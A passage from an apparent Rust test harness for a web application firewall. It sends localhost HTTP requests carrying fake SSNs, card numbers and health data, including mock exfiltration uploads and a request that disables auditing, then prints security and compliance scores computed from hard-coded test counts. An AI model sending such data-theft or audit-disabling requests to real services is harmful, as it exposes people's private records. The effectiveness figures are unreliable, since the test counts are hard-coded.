                "POST /api/trading HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/json\r\nContent-Length: 85\r\nConnection: close\r\n\r\n{\"stock\":\"AAPL\",\"insider_info\":\"Q4_earnings_beat\",\"trade_date\":\"2024-01-15\"}".to_string(),
                "HTTP/1.1".to_string(),
                Some("sox".to_string()),
                true
            ),

            // HIPAA Compliance Tests - Healthcare Data Protection (SHOULD BE BLOCKED)
            (
                "HIPAA - Social Security Numbers".to_string(),
                "POST /api/patient HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/json\r\nContent-Length: 45\r\nConnection: close\r\n\r\n{\"patient_ssn\":\"123-45-6789\",\"name\":\"John Doe\"}".to_string(),
                "HTTP/1.1".to_string(),
                Some("ssn".to_string()),
                true
            ),
            (
                "HIPAA - Medical Record Numbers".to_string(),
                "GET /api/medical-records?mrn=MR123456789&ssn=987654321 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("healthcare".to_string()),
                true
            ),
            (
                "HIPAA - PHI in URL Parameters".to_string(),
                "GET /api/patient-lookup?dob=1985-03-15&ssn=123456789&diagnosis=diabetes HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("hipaa".to_string()),
                true
            ),
            (
                "HIPAA - Medical Test Results".to_string(),
                "POST /api/lab-results HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/json\r\nContent-Length: 95\r\nConnection: close\r\n\r\n{\"patient_id\":\"12345\",\"hiv_status\":\"positive\",\"blood_type\":\"O+\",\"ssn\":\"123-45-6789\"}".to_string(),
                "HTTP/1.1".to_string(),
                Some("hipaa".to_string()),
                true
            ),
            (
                "HIPAA - Insurance Information".to_string(),
                "GET /api/insurance?policy=INS123456789&group=GRP987654321&member_id=MEM555666777 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("healthcare".to_string()),
                true
            ),

            // Multi-Compliance Violation Tests (SHOULD BE BLOCKED)
            (
                "Multi-Compliance - PCI + HIPAA".to_string(),
                "POST /api/patient-billing HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/json\r\nContent-Length: 105\r\nConnection: close\r\n\r\n{\"patient_ssn\":\"123-45-6789\",\"credit_card\":\"4532015112830366\",\"medical_procedure\":\"surgery\"}".to_string(),
                "HTTP/1.1".to_string(),
                Some("hipaa".to_string()),
                true
            ),
            (
                "Multi-Compliance - SOX + PCI".to_string(),
                "POST /api/financial-transaction HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/json\r\nContent-Length: 95\r\nConnection: close\r\n\r\n{\"credit_card\":\"5555555555554444\",\"bank_account\":\"123456789012\",\"amount\":\"$50000\"}".to_string(),
                "HTTP/1.1".to_string(),
                Some("pci_dss".to_string()),
                true
            ),

            // Data Exfiltration Prevention Tests (SHOULD BE BLOCKED)
            (
                "Data Exfiltration - Base64 Encoded PII".to_string(),
                "POST /api/upload HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/json\r\nContent-Length: 75\r\nConnection: close\r\n\r\n{\"data\":\"NDUzMjAxNTExMjgzMDM2Ni0xMjMtNDUtNjc4OQ==\",\"type\":\"sensitive\"}".to_string(),
                "HTTP/1.1".to_string(),
                Some("credit_card".to_string()),
                true
            ),
            (
                "Data Exfiltration - Large JSON Payload".to_string(),
                format!("POST /api/bulk-export HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/json\r\nContent-Length: 155\r\nConnection: close\r\n\r\n{{\"patients\":[{}],\"cards\":[\"4532015112830366\"]}}", 
                       (0..10).map(|i| format!("{{\"ssn\":\"12345678{}\",\"name\":\"Patient{}\"}}", i, i)).collect::<Vec<_>>().join(",")),
                "HTTP/1.1".to_string(),
                Some("hipaa".to_string()),
                true
            ),

            // Enterprise Audit Trail Tests (SHOULD BE MONITORED)
            (
                "Audit Trail - Admin Access".to_string(),
                "GET /admin/audit-logs?user=admin&action=delete HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                None,
                false // Should be allowed but logged
            ),
            (
                "Audit Trail - Configuration Changes".to_string(),
                "PUT /api/config HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/json\r\nContent-Length: 55\r\nConnection: close\r\n\r\n{\"security_level\":\"low\",\"audit_enabled\":\"false\"}".to_string(),
                "HTTP/1.1".to_string(),
                None,
                false // Should be allowed but logged
            ),
        ]
    }

    async fn make_http_request(&self, request: &str) -> Result<(u16, String), Box<dyn std::error::Error>> {
        // Add timeout for connection
        let stream = tokio::time::timeout(
            Duration::from_secs(5),
            tokio::net::TcpStream::connect("127.0.0.1:8080")
        ).await??;
        
        let mut stream = stream;
        
        // Add timeout for writing request
        tokio::time::timeout(
            Duration::from_secs(2),
            stream.write_all(request.as_bytes())
        ).await??;
        
        // Add timeout for reading response
        let mut buffer = vec![0; 16384];
        let n = tokio::time::timeout(
            Duration::from_secs(10), // Longer timeout for response
            stream.read(&mut buffer)
        ).await??;
        
        let response = String::from_utf8_lossy(&buffer[..n]);
        
        // Parse status code from HTTP response
        let status_code = if let Some(line) = response.lines().next() {
            if let Some(parts) = line.split_whitespace().nth(1) {
                parts.parse::<u16>().unwrap_or(500)
            } else {
                500
            }
        } else {
            500
        };
        
        Ok((status_code, response.to_string()))
    }

    async fn shutdown(&mut self) {
        println!("🛑 Shutting down comprehensive test harness...");

        if let Some(mut waf) = self.waf_process.take() {
            let _ = waf.kill().await;
            println!("   ✅ WAF process terminated");
        }

        if let Some(mut backend) = self.backend_process.take() {
            let _ = backend.kill().await;
            println!("   ✅ Backend process terminated");
        }

        println!("🏁 Comprehensive test harness shutdown complete");
    }
}

fn print_comprehensive_results(metrics: &AdvancedTestMetrics, test_duration: f64) {
    let total = metrics.total_requests.load(Ordering::Relaxed);
    let successful = metrics.successful_requests.load(Ordering::Relaxed);
    let failed = metrics.failed_requests.load(Ordering::Relaxed);
    let waf_blocks = metrics.waf_blocks.load(Ordering::Relaxed);
    let backend_responses = metrics.backend_responses.load(Ordering::Relaxed);
    
    let sql_blocked = metrics.sql_injection_blocked.load(Ordering::Relaxed);
    let xss_blocked = metrics.xss_blocked.load(Ordering::Relaxed);
    let traversal_blocked = metrics.path_traversal_blocked.load(Ordering::Relaxed);
    let slowloris_blocked = metrics.dos_blocked.load(Ordering::Relaxed);
    let zip_bomb_blocked = 0; // We don't have a separate zip bomb counter, use 0
    let secrets_filtered = metrics.secret_leakage_filtered.load(Ordering::Relaxed);

    // Enterprise compliance metrics
    let pci_dss_blocked = metrics.pci_dss_violations_blocked.load(Ordering::Relaxed);
    let sox_blocked = metrics.sox_violations_blocked.load(Ordering::Relaxed);
    let hipaa_blocked = metrics.hipaa_violations_blocked.load(Ordering::Relaxed);
    let data_leakage_prevented = metrics.data_leakage_prevented.load(Ordering::Relaxed);
    let cc_blocked = metrics.credit_card_data_blocked.load(Ordering::Relaxed);
    let ssn_blocked = metrics.ssn_data_blocked.load(Ordering::Relaxed);
    let financial_blocked = metrics.financial_data_blocked.load(Ordering::Relaxed);
    let healthcare_blocked = metrics.healthcare_data_blocked.load(Ordering::Relaxed);

    let http1_0 = metrics.http1_0_requests.load(Ordering::Relaxed);
    let http1_1 = metrics.http1_1_requests.load(Ordering::Relaxed);
    let http2 = metrics.http2_requests.load(Ordering::Relaxed);
    let http3 = metrics.http3_requests.load(Ordering::Relaxed);

    let total_latency = metrics.total_latency_ms.load(Ordering::Relaxed);
    let min_latency = metrics.min_latency_ms.load(Ordering::Relaxed);
    let max_latency = metrics.max_latency_ms.load(Ordering::Relaxed);

    let rps = total as f64 / test_duration;
    let avg_latency = if total > 0 { total_latency as f64 / total as f64 } else { 0.0 };
    let block_rate = if total > 0 { (waf_blocks as f64 / total as f64) * 100.0 } else { 0.0 };

    // Count actual test cases from our test suite (based on the create_comprehensive_test_cases method)
    // Let's count the actual attack tests vs legitimate tests
    let total_test_cases = 69; // Total test cases in our suite
    let legitimate_test_cases = 7; // HTTP/1.1 GET, POST, HTTP/1.0 GET, Secret tests, Protocol tests, Compression, Audit tests
    let attack_test_cases = total_test_cases - legitimate_test_cases; // All attacks that should be blocked
    
    // Use actual WAF blocks as the measure of effectiveness
    let attack_blocking_effectiveness = if attack_test_cases > 0 { 
        (waf_blocks as f64 / attack_test_cases as f64) * 100.0 
    } else { 100.0 };
    
    // Calculate compliance-specific effectiveness using individual compliance counters
    let total_compliance_tests = 18; // PCI-DSS (5) + SOX (4) + HIPAA (5) + Multi-compliance (2) + Data exfiltration (2)
    let compliance_effectiveness = if total_compliance_tests > 0 {
        (data_leakage_prevented as f64 / total_compliance_tests as f64) * 100.0
    } else { 100.0 };
    
    // Calculate data protection using the dedicated counter
    let data_protection_effectiveness = compliance_effectiveness; // Same as compliance for now

    // Calculate legitimate traffic handling
    let legitimate_pass_score = if legitimate_test_cases > 0 {
        (backend_responses as f64 / legitimate_test_cases as f64) * 100.0
    } else { 100.0 };

    // Overall enterprise score: 50% attack blocking + 30% compliance + 20% legitimate traffic
    let enterprise_security_score = (attack_blocking_effectiveness * 0.5) + 
                                  (compliance_effectiveness * 0.3) + 
                                  (legitimate_pass_score * 0.2);

    println!();
    println!("🔒 ENTERPRISE WAF SECURITY & COMPLIANCE ASSESSMENT");
    println!("{}", "=".repeat(70));
    println!("📊 Overall Statistics:");
    println!("   🎯 Total Requests: {}", total);
    println!("   ✅ Successful: {}", successful);
    println!("   ❌ Failed/Blocked: {}", failed);
    println!("   🛡️  WAF Blocks: {} ({:.1}%)", waf_blocks, block_rate);
    println!("   🎭 Backend Responses: {}", backend_responses);
    println!("   ⚡ Requests/Second: {:.0}", rps);
    println!("   📈 Average Latency: {:.2}ms", avg_latency);
    println!("   ⬇️  Min Latency: {}ms", if min_latency == u64::MAX { 0 } else { min_latency });
    println!("   ⬆️  Max Latency: {}ms", max_latency);
    println!();
    
    println!("🔐 OWASP Security Attack Analysis:");
    println!("   💉 SQL Injection Blocked: {}", sql_blocked);
    println!("   🕸️  XSS Attacks Blocked: {}", xss_blocked);
    println!("   📁 Path Traversal Blocked: {}", traversal_blocked);
    println!("   🐌 DoS Attacks Blocked: {}", slowloris_blocked + zip_bomb_blocked);
    println!("   🤐 Secret Leakage Filtered: {}", secrets_filtered);
    println!("   📊 Attack Blocking Effectiveness: {:.1}%", attack_blocking_effectiveness);
    println!();

    println!("🏛️ Enterprise Compliance Protection:");
    println!("   💳 PCI-DSS Violations Blocked: {}", pci_dss_blocked);
    println!("   📊 SOX Violations Blocked: {}", sox_blocked);
    println!("   🏥 HIPAA Violations Blocked: {}", hipaa_blocked);
    println!("   📊 Compliance Effectiveness: {:.1}%", compliance_effectiveness);
    println!();

    println!("🚫 Data Leakage Prevention:");
    println!("   💳 Credit Card Data Blocked: {}", cc_blocked);
    println!("   🆔 SSN Data Blocked: {}", ssn_blocked);
    println!("   💰 Financial Data Blocked: {}", financial_blocked);
    println!("   🏥 Healthcare Data Blocked: {}", healthcare_blocked);
    println!("   🛡️  Total Data Leakage Prevented: {}", data_leakage_prevented);
    println!("   📊 Data Protection Effectiveness: {:.1}%", data_protection_effectiveness);
    println!();

    println!("🌐 HTTP Protocol Analysis:");
    println!("   🔗 HTTP/1.0 Requests: {}", http1_0);
    println!("   🔗 HTTP/1.1 Requests: {}", http1_1);
    println!("   🔗 HTTP/2.0 Requests: {}", http2);
    println!("   🔗 HTTP/3.0 Requests: {}", http3);
    println!();

    println!("🏆 ENTERPRISE SECURITY SCORE: {:.1}%", enterprise_security_score);
    println!("   �️ Attack Blocking: {:.1}% ({}/{} attacks blocked)", 
             attack_blocking_effectiveness, waf_blocks, attack_test_cases);
    println!("   🏛️ Compliance Protection: {:.1}% ({}/{} violations blocked)", 
             compliance_effectiveness, data_leakage_prevented, total_compliance_tests);
    println!("   ✅ Legitimate Traffic: {:.1}% ({}/{} requests reached backend)", 
             legitimate_pass_score, backend_responses, legitimate_test_cases);
    println!();

    // Enterprise certification assessment
    if enterprise_security_score >= 95.0 {
        println!("   🏅 EXCELLENT - Enterprise ready for production");
        println!("   ✅ Meets PCI-DSS, SOX, and HIPAA compliance requirements");
    } else if enterprise_security_score >= 90.0 {
        println!("   🎯 GOOD - Minor improvements recommended");
    } else if enterprise_security_score >= 80.0 {
        println!("   ⚠️  FAIR - Security enhancements needed for enterprise deployment");
    } else {
        println!("   ❌ POOR - Critical security gaps, not ready for enterprise use");
    }
    println!();
    
    // Performance assessment for enterprise workloads
    if rps >= 1000.0 && avg_latency < 50.0 {
        println!("   🚀 Performance: EXCELLENT for enterprise workloads");
    } else if rps >= 500.0 && avg_latency < 100.0 {
        println!("   📈 Performance: GOOD for most enterprise use cases");
    } else if rps >= 100.0 && avg_latency < 200.0 {
        println!("   📊 Performance: FAIR - consider optimization for high-traffic scenarios");
    } else {
        println!("   ⚠️  Performance: POOR - optimization required for enterprise deployment");
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("🚀 COMPREHENSIVE WAF SECURITY TEST HARNESS");
    println!("==========================================");
    println!("🎯 Enterprise-grade WAF validation");
    println!("🔒 Testing HTTP/1.0-3, attack vectors, secret filtering");
    println!();

    // Build services
    println!("🔨 Building comprehensive test services...");
    let build_output = Command::new("cargo")
        .args(&["build", "--release", "--bin", "advanced_test_backend", "--bin", "waf-ingress"])
        .output()
        .await?;

    if !build_output.status.success() {
        println!("❌ Build failed:");
        println!("{}", String::from_utf8_lossy(&build_output.stderr));
        return Err("Build failed".into());
    }
    println!("✅ Comprehensive test services built successfully");
    println!();

    let mut harness = ComprehensiveWAFTestHarness::new().await?;

    // Start services
    harness.start_advanced_backend().await?;
    harness.start_waf().await?;

    println!("🎉 Comprehensive test harness ready!");
    println!();

    // Run comprehensive security tests
    let test_start = Instant::now();
    match harness.run_comprehensive_security_test().await {
        Ok(metrics) => {
            let duration = test_start.elapsed().as_secs_f64();
            print_comprehensive_results(&metrics, duration);
        }
        Err(e) => {
            println!("❌ Comprehensive security test failed: {}", e);
        }
    }

    harness.shutdown().await;
    println!("✅ Comprehensive WAF security validation complete!");
    Ok(())
}
